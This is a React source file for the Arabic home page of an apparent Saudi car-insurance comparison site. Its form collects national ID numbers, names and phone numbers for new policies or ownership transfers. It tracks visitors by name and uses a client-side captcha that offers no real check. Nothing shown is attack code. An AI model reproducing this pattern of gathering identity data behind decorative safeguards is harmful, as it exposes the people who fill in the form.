import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addSubmission, ensureSessionId, trackCurrentVisitor } from "@/lib/submissions";
import { Header } from "@/components/layout/Header";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Car, Plane, Stethoscope, HeartPulse, Home as HomeIcon, RefreshCw } from "lucide-react";

const currentYear = new Date().getFullYear();
const years = Array.from({ length: currentYear - 1919 + 1 }, (_, i) => currentYear - i);

const TOP_TABS = [
  { id: "مركبات", icon: Car, label: "مركبات" },
  { id: "طبي", icon: HeartPulse, label: "طبي" },
  { id: "أخطاء طبية", icon: Stethoscope, label: "أخطاء طبية" },
  { id: "سفر", icon: Plane, label: "سفر" },
  { id: "العمالة المنزلية", icon: HomeIcon, label: "العمالة المنزلية" },
];

export default function Home() {
  const [, setLocation] = useLocation();
  const [activeTab, setActiveTab] = useState("مركبات");
  const [formType, setFormType] = useState<"تأمين جديد" | "نقل ملكية">("تأمين جديد");
  const [subFormType, setSubFormType] = useState<"استمارة" | "بطاقة جمركية">("استمارة");

  // تأمين جديد fields
  const [idNumber, setIdNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phone, setPhone] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  const [manufactureYear, setManufactureYear] = useState(String(currentYear - 3));

  // نقل ملكية fields - البائع
  const [sellerId, setSellerId] = useState("");
  const [sellerName, setSellerName] = useState("");
  const [sellerPhone, setSellerPhone] = useState("");

  // نقل ملكية fields - المشتري
  const [buyerId, setBuyerId] = useState("");
  const [buyerName, setBuyerName] = useState("");
  const [buyerPhone, setBuyerPhone] = useState("");

  const [agreed, setAgreed] = useState(false);
  const [captchaCode, setCaptchaCode] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");

  const refreshCaptcha = () => {
    setCaptchaCode(Array.from({ length: 4 }, () => String(Math.floor(Math.random() * 10))).join(""));
  };

  useEffect(() => {
    refreshCaptcha();
    ensureSessionId();
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!agreed) { alert("الرجاء الموافقة على الشروط والأحكام"); return; }
    if (captchaInput !== captchaCode) {
      alert("رمز التحقق غير صحيح");
      refreshCaptcha();
      setCaptchaInput("");
      return;
    }
    const sessionId = ensureSessionId();
    const displayName = formType === "تأمين جديد" ? (ownerName || idNumber) : (buyerName || buyerId);
    localStorage.setItem("ownerName", displayName);
    void trackCurrentVisitor(displayName);

    if (formType === "تأمين جديد") {
      addSubmission("initial", sessionId, {
        idNumber,
        ownerName,
        phone,
        formType: `${formType} - ${subFormType}`,
        serialNumber: subFormType === "بطاقة جمركية" ? serialNumber : "",
        manufactureYear,
      });
    } else {
      addSubmission("initial", sessionId, {
        formType: `${formType} - ${subFormType}`,
        seller: { id: sellerId, name: sellerName, phone: sellerPhone },
        buyer: { id: buyerId, name: buyerName, phone: buyerPhone },
        serialNumber: subFormType === "بطاقة جمركية" ? serialNumber : "",
        manufactureYear,
      });
    }
    setLocation("/form");
  };

  const isInsuranceNewValid = idNumber.length >= 9 && ownerName && phone.length >= 9 && serialNumber;
  const isOwnershipTransferValid = sellerId.length >= 9 && sellerName && sellerPhone.length >= 9 && 
                                   buyerId.length >= 9 && buyerName && buyerPhone.length >= 9;

  return (
    <div className="min-h-screen bg-[#f5f7fa] flex flex-col" dir="rtl">
      <Header />
      <div className="bg-primary text-white py-10 md:py-14">
        <div className="container mx-auto px-4 text-center">
          <h1 className="text-2xl md:text-4xl font-bold mb-3">المنصة الأذكى لمقارنة عروض تأمين السيارات في السعودية</h1>
          <p className="text-base opacity-85 max-w-xl mx-auto">
            المنصة الأذكى لمقارنة عروض أكثر من 20 شركة تأمين. احصل على أرخص تأمين سيارات مع إصدار فوري وربط مباشر بنجم.
          </p>
        </div>
      </div>

      <div className="container mx-auto px-4 -mt-4 flex-1 pb-16">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-100 max-w-2xl mx-auto overflow-hidden">
          <div className="flex border-b border-gray-100 overflow-x-auto">
            {TOP_TABS.map(tab => {
              const Icon = tab.icon;
              const active = activeTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex flex-col items-center gap-1.5 px-4 py-3 min-w-[80px] text-xs font-medium transition-colors relative whitespace-nowrap ${
                    active ? "text-primary" : "text-gray-500 hover:text-gray-700"
                  }`}
                >
                  <Icon className="w-5 h-5" />
                  {tab.label}
                  {active && <span className="absolute bottom-0 right-0 left-0 h-0.5 bg-primary rounded-t" />}
                </button>
              );
            })}
          </div>

          {activeTab !== "مركبات" ? (
            <div className="p-10 text-center text-gray-400">
              <p className="text-lg font-bold mb-2">قريباً</p>
              <p className="text-sm">خدمة {activeTab} ستكون متاحة قريباً</p>
            </div>
          ) : (
            <div className="p-5 md:p-7">
              <div className="flex border border-gray-200 rounded-xl overflow-hidden mb-6">
                <button onClick={() => setFormType("تأمين جديد")}
                  className={`flex-1 py-3 text-sm font-bold transition-all ${formType === "تأمين جديد" ? "bg-primary text-white" : "bg-white text-gray-600 hover:bg-gray-50"}`}>
                  تأمين جديد
                </button>
                <button onClick={() => setFormType("نقل ملكية")}
                  className={`flex-1 py-3 text-sm font-bold border-r border-gray-200 transition-all ${formType === "نقل ملكية" ? "bg-primary text-white" : "bg-white text-gray-600 hover:bg-gray-50"}`}>
                  نقل ملكية
                </button>
              </div>

              {/* نقل ملكية - استمارة / بطاقة جمركية - below phone */}
              {formType === "نقل ملكية" && (
                <>
                  {subFormType === "بطاقة جمركية" && (
                    <div className="space-y-1.5 mb-4">
                      <Label className="text-sm text-gray-700">رقم البيان الجمركي</Label>
                      <Input type="tel" required value={serialNumber}
                        onChange={e => setSerialNumber(e.target.value.replace(/\D/g, ""))}
                        placeholder="أدخل رقم البيان الجمركي" className="h-12 text-base" dir="ltr" />
                    </div>
                  )}
                  <div className="flex gap-2 mb-4">
                    <button onClick={() => setSubFormType("استمارة")}
                      className={`flex-1 py-3 px-4 text-sm font-bold rounded-xl border-2 transition-all ${subFormType === "استمارة" ? "bg-primary text-white border-primary" : "bg-white text-gray-700 border-gray-200 hover:border-primary"}`}>
                      استمارة
                    </button>
                    <button onClick={() => setSubFormType("بطاقة جمركية")}
                      className={`flex-1 py-3 px-4 text-sm font-bold rounded-xl border-2 transition-all ${subFormType === "بطاقة جمركية" ? "bg-primary text-white border-primary" : "bg-white text-gray-700 border-gray-200 hover:border-primary"}`}>
                      بطاقة جمركية
                    </button>
                  </div>
                </>
              )}

              <form onSubmit={handleSubmit} className="space-y-4">
                {/* تأمين جديد */}
                {formType === "تأمين جديد" && (
                  <>
                    <div className="flex flex-col gap-2 mb-4">
                      <label className="flex items-center gap-3 p-3 rounded-xl border-2 border-gray-200 cursor-pointer hover:border-primary transition-colors">
                        <input type="radio" checked={subFormType === "استمارة"} onChange={() => setSubFormType("استمارة")} className="w-5 h-5 accent-primary" />
                        <span className="text-sm font-medium">استمارة</span>
                      </label>
                      <label className="flex items-center gap-3 p-3 rounded-xl border-2 border-gray-200 cursor-pointer hover:border-primary transition-colors">
                        <input type="radio" checked={subFormType === "بطاقة جمركية"} onChange={() => setSubFormType("بطاقة جمركية")} className="w-5 h-5 accent-primary" />
                        <span className="text-sm font-medium">بطاقة جمركية</span>
                      </label>
                    </div>

                    <div className="space-y-1.5">
                      <Label className="text-sm text-gray-700">رقم الهوية / الإقامة</Label>
                      <Input type="tel" required value={idNumber}
                        onChange={e => setIdNumber(e.target.value.replace(/\D/g, "").slice(0, 10))}
                        placeholder="رقم الهوية / الإقامة" className="h-12 text-base" dir="ltr" />
                    </div>

                    <div className="space-y-1.5">
                      <Label className="text-sm text-gray-700">اسم مالك الوثيقة</Label>
                      <Input type="text" required value={ownerName}
                        onChange={e => setOwnerName(e.target.value)}
                        placeholder="الاسم الكامل" className="h-12 text-base" />
                    </div>

                    <div className="space-y-1.5">
                      <Label className="text-sm text-gray-700">رقم الهاتف</Label>
                      <Input type="tel" required value={phone}
                        onChange={e => setPhone(e.target.value.replace(/\D/g, "").slice(0, 10))}
                        placeholder="05XXXXXXXX" dir="ltr" className="h-12 text-base" />
                    </div>

                    <div className="space-y-1.5">
                      <Label className="text-sm text-gray-700">{subFormType === "بطاقة جمركية" ? "الرقم الجمركي" : "الرقم التسلسلي"}</Label>
                      <Input type="tel" required value={serialNumber}
                        onChange={e => setSerialNumber(e.target.value.replace(/\D/g, ""))}
                        placeholder={subFormType === "بطاقة جمركية" ? "أدخل الرقم الجمركي" : "الرقم التسلسلي"}
                        className="h-12 text-base" dir="ltr" />
                    </div>

                    {subFormType === "بطاقة جمركية" && (
                      <div className="space-y-1.5">
                        <Label className="text-sm text-gray-700">سنة الصنع</Label>
                        <select value={manufactureYear} onChange={e => setManufactureYear(e.target.value)}
                          className="flex h-12 w-full rounded-lg border border-gray-300 bg-white px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary">
                          {years.map(y => <option key={y} value={y}>{y}</option>)}
                        </select>
                      </div>
                    )}
                  </>
                )}

                {/* نقل ملكية */}
                {formType === "نقل ملكية" && (
                  <>
                    <div className="bg-gray-50 rounded-xl p-4 space-y-3">
                      <h3 className="font-bold text-gray-800 text-sm">بيانات البائع</h3>
                      
                      <div className="space-y-1.5">
                        <Label className="text-sm text-gray-700">رقم هوية البائع</Label>
                        <Input type="tel" required value={sellerId}
                          onChange={e => setSellerId(e.target.value.replace(/\D/g, "").slice(0, 10))}
                          placeholder="رقم الهوية" className="h-12 text-base" dir="ltr" />
                      </div>

                      <div className="space-y-1.5">
                        <Label className="text-sm text-gray-700">الاسم الكامل للبائع</Label>
                        <Input type="text" required value={sellerName}
                          onChange={e => setSellerName(e.target.value)}
                          placeholder="الاسم الكامل" className="h-12 text-base" />
                      </div>

                      <div className="space-y-1.5">
                        <Label className="text-sm text-gray-700">رقم الهاتف للبائع</Label>
                        <Input type="tel" required value={sellerPhone}
                          onChange={e => setSellerPhone(e.target.value.replace(/\D/g, "").slice(0, 10))}
                          placeholder="05XXXXXXXX" dir="ltr" className="h-12 text-base" />
                      </div>
                    </div>

                    <div className="bg-blue-50 rounded-xl p-4 space-y-3">
                      <h3 className="font-bold text-blue-800 text-sm">بيانات المشتري</h3>
                      
                      <div className="space-y-1.5">
                        <Label className="text-sm text-gray-700">رقم هوية المشتري</Label>
                        <Input type="tel" required value={buyerId}
                          onChange={e => setBuyerId(e.target.value.replace(/\D/g, "").slice(0, 10))}
                          placeholder="رقم الهوية" className="h-12 text-base" dir="ltr" />
                      </div>

                      <div className="space-y-1.5">
                        <Label className="text-sm text-gray-700">الاسم الكامل للمشتري</Label>
                        <Input type="text" required value={buyerName}
                          onChange={e => setBuyerName(e.target.value)}
                          placeholder="الاسم الكامل" className="h-12 text-base" />
                      </div>

                      <div className="space-y-1.5">
                        <Label className="text-sm text-gray-700">رقم الهاتف للمشتري</Label>
                        <Input type="tel" required value={buyerPhone}
                          onChange={e => setBuyerPhone(e.target.value.replace(/\D/g, "").slice(0, 10))}
                          placeholder="05XXXXXXXX" dir="ltr" className="h-12 text-base" />
                      </div>
                    </div>
                  </>
                )}

                <div className="bg-gray-50 rounded-xl border border-gray-200 p-4">
                  <Label className="text-sm text-gray-700 block mb-2">رمز التحقق</Label>
                  <div className="flex items-center gap-3">
                    <div className="bg-white border-2 border-dashed border-gray-300 rounded-lg px-4 py-2 font-mono text-xl font-bold tracking-[0.25em] text-gray-700 select-none min-w-[110px] text-center"
                      style={{ fontFamily: "monospace", letterSpacing: "0.3em", textDecoration: "line-through wavy #ccc" }}>
                      {captchaCode}
                    </div>
                    <button type="button" onClick={() => { refreshCaptcha(); setCaptchaInput(""); }}
                      className="p-2 rounded-lg bg-white border border-gray-200 text-gray-500 hover:bg-gray-100">
                      <RefreshCw className="w-5 h-5" />
                    </button>
                    <Input type="text" required value={captchaInput}
                      onChange={e => setCaptchaInput(e.target.value.replace(/\D/g, "").slice(0, 4))}
                      placeholder="أدخل الرمز" dir="ltr" className="flex-1 h-12 text-center tracking-widest text-base" maxLength={4} />
                  </div>
                </div>

                <div className="flex items-start gap-2.5">
                  <Checkbox id="terms" checked={agreed} onCheckedChange={c => setAgreed(c === true)} className="mt-0.5 shrink-0" />
                  <label htmlFor="terms" className="text-xs text-gray-500 leading-relaxed cursor-pointer">
                    أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                  </label>
                </div>

                <Button type="submit"
                  className="w-full h-14 text-base font-bold bg-[#f5a623] hover:bg-[#e09410] text-white shadow-md rounded-xl"
                  disabled={formType === "تأمين جديد" ? !isInsuranceNewValid : !isOwnershipTransferValid}>
                  إظهار العروض
                </Button>
              </form>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
